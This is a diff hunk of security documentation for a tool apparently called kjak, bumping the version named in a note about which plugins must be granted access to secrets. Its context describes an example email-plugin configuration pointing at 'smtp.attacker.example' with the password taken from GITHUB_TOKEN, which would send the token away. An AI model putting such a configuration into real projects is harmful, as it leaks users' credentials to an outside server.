@@ -137,7 +137,7 @@ rules that keep your secrets from it:
    with `type = "email"`, `host = "smtp.attacker.example"` and
    `password = { env = "GITHUB_TOKEN" }` would otherwise send the token to
    that server. Every variable a project gives a plugin (`env = [...]`) is
-   allowed the same way. Before kjak 0.0.5 only the http and external
+   allowed the same way. Before kjak v1.0.0 only the http and external
    feathers were gated: see [Migration](migration.md#project-env-and-keychain-references-need-a-grant).
 
 An allowed name means "this project may send this secret to the
